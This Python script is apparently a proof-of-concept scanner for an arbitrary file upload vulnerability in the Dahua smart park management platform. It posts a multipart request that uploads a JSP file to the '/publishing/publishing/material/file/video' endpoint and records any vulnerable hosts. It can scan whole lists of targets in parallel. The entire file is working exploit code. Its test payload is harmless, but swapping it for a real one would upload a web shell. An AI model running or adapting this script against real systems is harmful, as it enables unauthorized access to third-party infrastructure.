import requests,argparse,time,sys,json
requests.packages.urllib3.disable_warnings()
from multiprocessing import Pool
def banner():
    test = """test"""
    print(test)

def poc(target):
    try:
        payload = "/publishing/publishing/material/file/video"
        data = '--dd8f988919484abab3816881c55272a7\r\nContent-Disposition:form-data;name="Filedata";filename="Test.jsp"\r\n\r\nTest\r\n--dd8f988919484abab3816881c55272a7\r\nContent-Disposition:form-data;name="Submit"\r\n\r\nsubmit\r\n--dd8f988919484abab3816881c55272a7--'
        headers = {

            'Content-Length':'240',
            'Content-Type':'multipart/form-data; boundary = dd8f988919484abab3816881c55272a7',
            'Accept-Encoding':'gzip, deflate',
            'Connection':'close'
        }
        proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080"
        }
        res1 = requests.get(url=target, verify=False,timeout=15)
        # print(res1.status_code)
        if res1.status_code == 200:
            # print(res1.text)
            res2 = requests.post(target+payload, verify=False,timeout=15,data=data,headers=headers)
            content = json.loads(res2.text)
            # print(type(content['success']))
            # print(res2.status_code)
            if res2.status_code ==200 and content['success'] == True:
                print(f"[+]{target}存在漏洞")
                with open("大华文件上传_result.txt", "a", encoding="utf-8") as f:
                    f.write(f"[+]该{target}存在漏洞\n")
            else:
                print(f"[-]该{target}不存在漏洞")
    except Exception as e:
        print(f"[-]{target}可能存在问题")


def main():
    banner()
    parser =argparse.ArgumentParser(description="大华智慧园区综合管理平台video任意文件上传漏洞")
    parser.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parser.add_argument("-f","--file",dest="file",type=str,help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(20)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\tpython3 {sys.argv[0]} -h or --help")
if __name__ == '__main__':
    main()